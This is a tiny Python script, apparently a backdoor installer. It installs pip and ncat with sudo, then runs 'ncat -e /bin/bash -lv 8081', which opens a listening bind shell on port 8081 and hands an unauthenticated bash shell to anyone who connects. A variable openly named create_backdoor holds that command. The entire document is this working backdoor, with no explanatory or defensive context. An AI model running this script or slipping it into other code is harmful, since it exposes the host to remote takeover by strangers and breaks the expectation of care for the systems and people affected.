import os
os.system("sudo apt install python3-pip")
os.system("sudo apt install ncat")
create_backdoor = "ncat -e '/bin/bash' -lv 8081"
os.system(create_backdoor)
